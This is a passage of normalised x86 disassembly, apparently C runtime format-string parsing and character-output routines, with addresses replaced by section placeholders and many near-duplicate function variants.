mov [ esi + 0xaa4 ] ecx
mov ecx eax
sub_4279f3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
push edi
cmp [ esi + 0x1c ] ebx
jne r-xdata
mov al bl
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
cmp al 0x25
je r-xdata
xor edi edi
cmp [ esi + 0x45c ] edi
jne r-xdata
cmp [ esi + 0x45c ] 0x2
jne r-xdata
mov [ ebp - 0x4 ] edi
cmp al 0x30
jl r-xdata
push 0xa
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push [ esi + 0x10 ]
call sub_434140
mov edx [ ebp - 0x8 ]
add esp 0xc
lea ecx [ eax - 0x1 ]
lea eax [ edx + 0x1 ]
mov [ esi + 0xaa8 ] ecx
mov [ esi + 0x10 ] eax
cmp [ esi + 0x458 ] ebx
jne r-xdata
mov [ esi + 0x45c ] ebx
cmp al 0x39
jg r-xdata
test ecx ecx
js r-xdata
push 0xa
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_434140
add esp 0xc
test eax eax
jle r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
cmp [ edx ] 0x24
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x24
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ecx 0x64
jge r-xdata
cmp [ esi + 0x458 ] ebx
jne r-xdata
mov eax [ esi + 0xaa4 ]
cmp ecx eax
jg r-xdata
mov [ esi + 0x45c ] 0x2
jmp r-xdata
push 0x640
lea eax [ esi + 0x464 ]
push edi
push eax
call sub_40de60
add esp 0xc
mov [ esi + 0xaa4 ] ecx
mov ecx eax
sub_427aeb
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
push edi
cmp [ esi + 0x1c ] ebx
jne r-xdata
mov al bl
mov ecx [ esi + 0x10 ]
movzx eax [ ecx ]
cmp eax 0x25
je r-xdata
xor edi edi
cmp [ esi + 0x45c ] edi
jne r-xdata
cmp [ esi + 0x45c ] 0x2
jne r-xdata
mov [ ebp - 0x4 ] edi
cmp eax 0x30
jb r-xdata
push 0xa
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push [ esi + 0x10 ]
call sub_434260
mov edx [ ebp - 0x8 ]
add esp 0xc
lea ecx [ eax - 0x1 ]
lea eax [ edx + 0x2 ]
mov [ esi + 0xaa8 ] ecx
mov [ esi + 0x10 ] eax
cmp [ esi + 0x458 ] ebx
jne r-xdata
mov [ esi + 0x45c ] ebx
cmp eax 0x39
ja r-xdata
test ecx ecx
js r-xdata
push 0xa
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_434260
add esp 0xc
test eax eax
jle r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
push 0x24
pop eax
cmp [ edx ] ax
jne r-xdata
mov eax [ ebp - 0x4 ]
push 0x24
pop ecx
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ecx 0x64
jge r-xdata
cmp [ esi + 0x458 ] ebx
jne r-xdata
mov eax [ esi + 0xaa4 ]
cmp ecx eax
jg r-xdata
mov [ esi + 0x45c ] 0x2
jmp r-xdata
push 0x640
lea eax [ esi + 0x464 ]
push edi
push eax
call sub_40de60
add esp 0xc
mov [ esi + 0xaa4 ] ecx
mov ecx eax
sub_427bed
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
push edi
cmp [ esi + 0x1c ] ebx
jne r-xdata
mov al bl
mov ecx [ esi + 0x10 ]
movzx eax [ ecx ]
cmp eax 0x25
je r-xdata
xor edi edi
cmp [ esi + 0x45c ] edi
jne r-xdata
cmp [ esi + 0x45c ] 0x2
jne r-xdata
mov [ ebp - 0x4 ] edi
cmp eax 0x30
jb r-xdata
push 0xa
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push [ esi + 0x10 ]
call sub_434260
mov edx [ ebp - 0x8 ]
add esp 0xc
lea ecx [ eax - 0x1 ]
lea eax [ edx + 0x2 ]
mov [ esi + 0xaa8 ] ecx
mov [ esi + 0x10 ] eax
cmp [ esi + 0x458 ] ebx
jne r-xdata
mov [ esi + 0x45c ] ebx
cmp eax 0x39
ja r-xdata
test ecx ecx
js r-xdata
push 0xa
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_434260
add esp 0xc
test eax eax
jle r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
push 0x24
pop eax
cmp [ edx ] ax
jne r-xdata
mov eax [ ebp - 0x4 ]
push 0x24
pop ecx
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ecx 0x64
jge r-xdata
cmp [ esi + 0x458 ] ebx
jne r-xdata
mov eax [ esi + 0xaa4 ]
cmp ecx eax
jg r-xdata
mov [ esi + 0x45c ] 0x2
jmp r-xdata
push 0x640
lea eax [ esi + 0x464 ]
push edi
push eax
call sub_40de60
add esp 0xc
mov [ esi + 0xaa4 ] ecx
mov ecx eax
sub_427d83
mov edi edi
push esi
mov esi ecx
call sub_427cfb
test al al
jne r-xdata
cmp [ esi + 0x45c ] 0x2
jne r-xdata
xor al al
pop esi
retn
mov al 0x1
pop esi
retn
cmp [ esi + 0x458 ] 0x1
jne r-xdata
mov eax [ esi + 0xaa4 ]
lea edx [ esi + 0x474 ]
shl eax 0x4
lea ecx [ esi + 0x464 ]
add edx eax
jmp r-xdata
cmp ecx edx
jne r-xdata
mov eax [ esi + 0x14 ]
mov [ ecx + 0x8 ] eax
mov eax [ ecx ]
sub eax 0x1
je r-xdata
add [ esi + 0x14 ] 0x4
sub eax 0x1
je r-xdata
add [ esi + 0x14 ] 0x8
jmp r-xdata
sub eax 0x1
je r-xdata
add ecx 0x10
sub eax 0x1
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
jmp r-xdata
sub_427e03
mov edi edi
push esi
mov esi ecx
call sub_427d1d
test al al
jne r-xdata
cmp [ esi + 0x45c ] 0x2
jne r-xdata
xor al al
pop esi
retn
mov al 0x1
pop esi
retn
cmp [ esi + 0x458 ] 0x1
jne r-xdata
mov eax [ esi + 0xaa4 ]
lea edx [ esi + 0x474 ]
shl eax 0x4
lea ecx [ esi + 0x464 ]
add edx eax
jmp r-xdata
cmp ecx edx
jne r-xdata
mov eax [ esi + 0x14 ]
mov [ ecx + 0x8 ] eax
mov eax [ ecx ]
sub eax 0x1
je r-xdata
add [ esi + 0x14 ] 0x4
sub eax 0x1
je r-xdata
add [ esi + 0x14 ] 0x8
jmp r-xdata
sub eax 0x1
je r-xdata
add ecx 0x10
sub eax 0x1
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
jmp r-xdata
sub_427e83
mov edi edi
push esi
mov esi ecx
call sub_427d3f
test al al
jne r-xdata
cmp [ esi + 0x45c ] 0x2
jne r-xdata
xor al al
pop esi
retn
mov al 0x1
pop esi
retn
cmp [ esi + 0x458 ] 0x1
jne r-xdata
mov eax [ esi + 0xaa4 ]
lea edx [ esi + 0x474 ]
shl eax 0x4
lea ecx [ esi + 0x464 ]
add edx eax
jmp r-xdata
cmp ecx edx
jne r-xdata
mov eax [ esi + 0x14 ]
mov [ ecx + 0x8 ] eax
mov eax [ ecx ]
sub eax 0x1
je r-xdata
add [ esi + 0x14 ] 0x4
sub eax 0x1
je r-xdata
add [ esi + 0x14 ] 0x8
jmp r-xdata
sub eax 0x1
je r-xdata
add ecx 0x10
sub eax 0x1
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
jmp r-xdata
sub_427f03
mov edi edi
push esi
mov esi ecx
call sub_427d61
test al al
jne r-xdata
cmp [ esi + 0x45c ] 0x2
jne r-xdata
xor al al
pop esi
retn
mov al 0x1
pop esi
retn
cmp [ esi + 0x458 ] 0x1
jne r-xdata
mov eax [ esi + 0xaa4 ]
lea edx [ esi + 0x474 ]
shl eax 0x4
lea ecx [ esi + 0x464 ]
add edx eax
jmp r-xdata
cmp ecx edx
jne r-xdata
mov eax [ esi + 0x14 ]
mov [ ecx + 0x8 ] eax
mov eax [ ecx ]
sub eax 0x1
je r-xdata
add [ esi + 0x14 ] 0x4
sub eax 0x1
je r-xdata
add [ esi + 0x14 ] 0x8
jmp r-xdata
sub eax 0x1
je r-xdata
add ecx 0x10
sub eax 0x1
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
jmp r-xdata
sub_427f8f
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
mov al 0x1
retn
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
cmp edx 0x64
jge r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x4
add eax edx
push eax
call sub_4277cb
retn
sub_427fe2
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
mov al 0x1
retn
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
cmp edx 0x64
jge r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x4
add eax edx
push eax
call sub_427816
retn
sub_428035
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
mov al 0x1
retn
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
cmp edx 0x64
jge r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x4
add eax edx
push eax
call sub_427861
retn
sub_428088
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
mov al 0x1
retn
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
cmp edx 0x64
jge r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x4
add eax edx
push eax
call sub_4278ae
retn
sub_4280e7
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
mov eax [ ecx + 0xc ]
shr eax 0xc
test al 0x1
jne r-xdata
mov al 0x1
push ecx
call sub_432468
mov edx eax
mov esi rw-data
pop ecx
cmp edx 0xffffffff
je r-xdata
mov eax esi
cmp edx 0xfffffffe
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
cmp edx 0xffffffff
je r-xdata
and eax 0x3f
mov ecx edx
imul eax eax 0x30
sar ecx 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
pop esi
pop ebp
retn
test [ esi + 0x2d ] 0x1
je r-xdata
cmp edx 0xfffffffe
je r-xdata
cmp [ eax + 0x29 ] 0x0
jne r-xdata
mov eax edx
and edx 0x3f
imul esi edx 0x30
sar eax 0x6
add esi [ eax * 4 + rw-data ]
sub_4281b4
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
mov eax [ eax + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
push [ ecx ]
movsx eax [ ebp + 0x8 ]
push eax
call sub_435b4c
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
inc [ eax ]
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
jmp r-xdata
pop ebp
retn 0x8
sub_4281f1
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
mov eax [ eax + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
push [ ecx ]
push [ ebp + 0x8 ]
call sub_435970
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
inc [ eax ]
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
jmp r-xdata
pop ebp
retn 0x8
sub_428231
mov edi edi
push ebp
mov ebp esp
mov edx ecx
mov ecx [ edx ]
mov eax [ ecx + 0x8 ]
cmp eax [ ecx + 0x4 ]
mov eax [ ebp + 0xc ]
jne r-xdata
inc [ eax ]
mov eax [ edx ]
inc [ eax + 0x8 ]
mov eax [ edx ]
mov ecx [ eax ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
mov eax [ edx ]
inc [ eax ]
mov al 0x1
cmp [ ecx + 0xc ] 0x0
je r-xdata
or [ eax ] 0xffffffff
inc [ eax ]
jmp r-xdata
pop ebp
retn 0x8
mov eax [ edx ]
mov al [ eax + 0xc ]
jmp r-xdata
sub_428273
mov edi edi
push ebp
mov ebp esp
mov edx ecx
mov ecx [ edx ]
mov eax [ ecx + 0x8 ]
cmp eax [ ecx + 0x4 ]
mov eax [ ebp + 0xc ]
jne r-xdata
inc [ eax ]
mov eax [ edx ]
inc [ eax + 0x8 ]
mov eax [ edx ]
mov ecx [ eax ]
mov ax [ ebp + 0x8 ]
mov [ ecx ] ax
mov eax [ edx ]
add [ eax ] 0x2
mov al 0x1
cmp [ ecx + 0xc ] 0x0
je r-xdata
or [ eax ] 0xffffffff
inc [ eax ]
jmp r-xdata
pop ebp
retn 0x8
mov eax [ edx ]
mov al [ eax + 0xc ]
jmp r-xdata
sub_4282b8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_4289e4
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov edi [ esi + 0x34 ]
xor ebx ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
movzx eax [ edi ]
lea edi [ edi + 0x2 ]
and [ ebp - 0x10 ] 0x0
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_434609
add esp 0x10
test eax eax
jne r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x10 ] eax
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
lea ecx [ esi + 0x448 ]
call sub_4289e4
inc ebx
cmp ebx [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_42835f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_4289e4
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov edi [ esi + 0x34 ]
xor ebx ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
movzx eax [ edi ]
lea edi [ edi + 0x2 ]
and [ ebp - 0x10 ] 0x0
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_434609
add esp 0x10
test eax eax
jne r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x10 ] eax
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
lea ecx [ esi + 0x448 ]
call sub_4289e4
inc ebx
cmp ebx [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_428406
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_4289e4
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov edi [ esi + 0x34 ]
xor ebx ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
movzx eax [ edi ]
lea edi [ edi + 0x2 ]
and [ ebp - 0x10 ] 0x0
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_434609
add esp 0x10
test eax eax
jne r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x10 ] eax
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
lea ecx [ esi + 0x448 ]
call sub_4289e4
inc ebx
cmp ebx [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_4284ad
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428afb
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov edi [ esi + 0x34 ]
xor ebx ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
movzx eax [ edi ]
lea edi [ edi + 0x2 ]
and [ ebp - 0x10 ] 0x0
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_434609
add esp 0x10
test eax eax
jne r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x10 ] eax
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
lea ecx [ esi + 0x448 ]
call sub_428afb
inc ebx
cmp ebx [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_428554
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428afb
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov edi [ esi + 0x34 ]
xor ebx ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
movzx eax [ edi ]
lea edi [ edi + 0x2 ]
and [ ebp - 0x10 ] 0x0
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_434609
add esp 0x10
test eax eax
jne r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x10 ] eax
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
lea ecx [ esi + 0x448 ]
call sub_428afb
inc ebx
cmp ebx [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_4285fb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428afb
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov edi [ esi + 0x34 ]
xor ebx ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
movzx eax [ edi ]
lea edi [ edi + 0x2 ]
and [ ebp - 0x10 ] 0x0
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_434609
add esp 0x10
test eax eax
jne r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x10 ] eax
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
lea ecx [ esi + 0x448 ]
call sub_428afb
inc ebx
cmp ebx [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_4286a2
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428a6e
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov ebx [ esi + 0x34 ]
xor edi edi
test eax eax
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x4 ] ax
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push ebx
push eax
call sub_43434d
add esp 0x10
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x18 ]
push ecx
push [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
call sub_4281f1
add ebx [ ebp - 0x8 ]
inc edi
cmp edi [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_42872d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428a6e
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov ebx [ esi + 0x34 ]
xor edi edi
test eax eax
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x4 ] ax
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push ebx
push eax
call sub_43434d
add esp 0x10
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x18 ]
push ecx
push [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
call sub_4281f1
add ebx [ ebp - 0x8 ]
inc edi
cmp edi [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_4287b8
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428a6e
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov ebx [ esi + 0x34 ]
xor edi edi
test eax eax
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x4 ] ax
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push ebx
push eax
call sub_43434d
add esp 0x10
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x18 ]
push ecx
push [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
call sub_4281f1
add ebx [ ebp - 0x8 ]
inc edi
cmp edi [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_428843
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428b8e
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov ebx [ esi + 0x34 ]
xor edi edi
test eax eax
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x4 ] ax
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push ebx
push eax
call sub_43434d
add esp 0x10
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x18 ]
push ecx
push [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
call sub_428273
add ebx [ ebp - 0x8 ]
inc edi
cmp edi [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_4288ce
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428b8e
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov ebx [ esi + 0x34 ]
xor edi edi
test eax eax
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x4 ] ax
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push ebx
push eax
call sub_43434d
add esp 0x10
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x18 ]
push ecx
push [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
call sub_428273
add ebx [ ebp - 0x8 ]
inc edi
cmp edi [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_428959
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428b8e
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov ebx [ esi + 0x34 ]
xor edi edi
test eax eax
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x4 ] ax
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push ebx
push eax
call sub_43434d
add esp 0x10
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x18 ]
push ecx
push [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
call sub_428273
add ebx [ ebp - 0x8 ]
inc edi
cmp edi [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_4289e4
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx ecx
mov eax [ ebx ]
mov eax [ eax + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
add eax edi
mov [ ebp - 0x4 ] eax
